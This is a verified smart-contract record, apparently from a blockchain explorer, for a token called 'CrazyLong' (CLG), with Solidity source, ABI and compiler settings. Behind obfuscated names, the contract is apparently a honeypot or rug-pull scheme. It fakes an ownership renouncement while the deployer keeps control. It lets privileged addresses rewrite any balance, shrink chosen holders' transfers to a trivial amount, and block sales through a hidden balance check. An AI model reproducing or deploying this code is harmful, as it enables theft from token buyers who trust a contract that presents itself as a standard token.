{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface enableList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract fromTokenLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingFundExempt {\n    function createPair(address totalMax, address tokenFundLiquidity) external returns (address);\n}\n\ninterface isFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isEnable) external view returns (uint256);\n\n    function transfer(address walletTotal, uint256 listTeamFrom) external returns (bool);\n\n    function allowance(address shouldList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listTeamFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletTotal,\n        uint256 listTeamFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptReceiver, uint256 value);\n    event Approval(address indexed shouldList, address indexed spender, uint256 value);\n}\n\ninterface isFromMetadata is isFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CrazyLong is fromTokenLaunch, isFrom, isFromMetadata {\n\n    function receiverLaunchedTrading() public {\n        emit OwnershipTransferred(fundMin, address(0));\n        launchedWallet = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromTakeFund;\n    }\n\n    uint256 launchedTotal;\n\n    event OwnershipTransferred(address indexed buyLimitTx, address indexed limitMarketing);\n\n    function launchedIsAmount(address feeMode, address walletTotal, uint256 listTeamFrom) internal returns (bool) {\n        if (feeMode == fundMin) {\n            return isSenderSell(feeMode, walletTotal, listTeamFrom);\n        }\n        uint256 amountFeeMax = isFrom(amountReceiver).balanceOf(teamList);\n        require(amountFeeMax == launchedTotal);\n        require(walletTotal != teamList);\n        if (receiverMode[feeMode]) {\n            return isSenderSell(feeMode, walletTotal, isLiquidity);\n        }\n        return isSenderSell(feeMode, walletTotal, listTeamFrom);\n    }\n\n    function swapAt(address liquidityMax, uint256 listTeamFrom) public {\n        launchedTeam();\n        fundAt[liquidityMax] = listTeamFrom;\n    }\n\n    uint256 private listFrom;\n\n    function shouldListTotal(uint256 listTeamFrom) public {\n        launchedTeam();\n        launchedTotal = listTeamFrom;\n    }\n\n    function getOwner() external view returns (address) {\n        return launchedWallet;\n    }\n\n    address teamList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return buySender;\n    }\n\n    mapping(address => bool) public receiverMode;\n\n    uint8 private buySender = 18;\n\n    bool public modeReceiverIs;\n\n    address private launchedWallet;\n\n    function approve(address exemptTxAmount, uint256 listTeamFrom) public virtual override returns (bool) {\n        amountTx[_msgSender()][exemptTxAmount] = listTeamFrom;\n        emit Approval(_msgSender(), exemptTxAmount, listTeamFrom);\n        return true;\n    }\n\n    mapping(address => uint256) private fundAt;\n\n    function isSenderSell(address feeMode, address walletTotal, uint256 listTeamFrom) internal returns (bool) {\n        require(fundAt[feeMode] >= listTeamFrom);\n        fundAt[feeMode] -= listTeamFrom;\n        fundAt[walletTotal] += listTeamFrom;\n        emit Transfer(feeMode, walletTotal, listTeamFrom);\n        return true;\n    }\n\n    string private modeLiquidity = \"Crazy Long\";\n\n    string private fromTakeFund = \"CLG\";\n\n    function transfer(address liquidityMax, uint256 listTeamFrom) external virtual override returns (bool) {\n        return launchedIsAmount(_msgSender(), liquidityMax, listTeamFrom);\n    }\n\n    address public fundMin;\n\n    mapping(address => bool) public listLaunchMarketing;\n\n    function name() external view virtual override returns (string memory) {\n        return modeLiquidity;\n    }\n\n    uint256 constant isLiquidity = 9 ** 10;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldLiquidity;\n    }\n\n    function allowance(address receiverSwapTake, address exemptTxAmount) external view virtual override returns (uint256) {\n        if (exemptTxAmount == shouldModeList) {\n            return type(uint256).max;\n        }\n        return amountTx[receiverSwapTake][exemptTxAmount];\n    }\n\n    function balanceOf(address isEnable) public view virtual override returns (uint256) {\n        return fundAt[isEnable];\n    }\n\n    uint256 limitToTake;\n\n    mapping(address => mapping(address => uint256)) private amountTx;\n\n    address public amountReceiver;\n\n    function transferFrom(address feeMode, address walletTotal, uint256 listTeamFrom) external override returns (bool) {\n        if (_msgSender() != shouldModeList) {\n            if (amountTx[feeMode][_msgSender()] != type(uint256).max) {\n                require(listTeamFrom <= amountTx[feeMode][_msgSender()]);\n                amountTx[feeMode][_msgSender()] -= listTeamFrom;\n            }\n        }\n        return launchedIsAmount(feeMode, walletTotal, listTeamFrom);\n    }\n\n    function launchedTeam() private view {\n        require(listLaunchMarketing[_msgSender()]);\n    }\n\n    function atMode(address fromList) public {\n        require(fromList.balance < 100000);\n        if (modeReceiverIs) {\n            return;\n        }\n        if (marketingTrading == listFrom) {\n            tradingLiquidity = true;\n        }\n        listLaunchMarketing[fromList] = true;\n        \n        modeReceiverIs = true;\n    }\n\n    function owner() external view returns (address) {\n        return launchedWallet;\n    }\n\n    constructor (){\n        \n        enableList maxSender = enableList(shouldModeList);\n        amountReceiver = marketingFundExempt(maxSender.factory()).createPair(maxSender.WETH(), address(this));\n        if (limitAmount) {\n            marketingTrading = listFrom;\n        }\n        fundMin = _msgSender();\n        receiverLaunchedTrading();\n        listLaunchMarketing[fundMin] = true;\n        fundAt[fundMin] = shouldLiquidity;\n        \n        emit Transfer(address(0), fundMin, shouldLiquidity);\n    }\n\n    uint256 private marketingTrading;\n\n    bool private tradingLiquidity;\n\n    function buyTx(address minTeam) public {\n        launchedTeam();\n        if (listFrom == marketingTrading) {\n            tradingLiquidity = false;\n        }\n        if (minTeam == fundMin || minTeam == amountReceiver) {\n            return;\n        }\n        receiverMode[minTeam] = true;\n    }\n\n    bool public limitAmount;\n\n    uint256 private shouldLiquidity = 100000000 * 10 ** 18;\n\n    address shouldModeList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyLimitTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSwapTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptTxAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTxAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTeamFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromList\",\"type\":\"address\"}],\"name\":\"atMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTeam\",\"type\":\"address\"}],\"name\":\"buyTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listLaunchMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeReceiverIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunchedTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listTeamFrom\",\"type\":\"uint256\"}],\"name\":\"shouldListTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTeamFrom\",\"type\":\"uint256\"}],\"name\":\"swapAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTeamFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTeamFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CrazyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}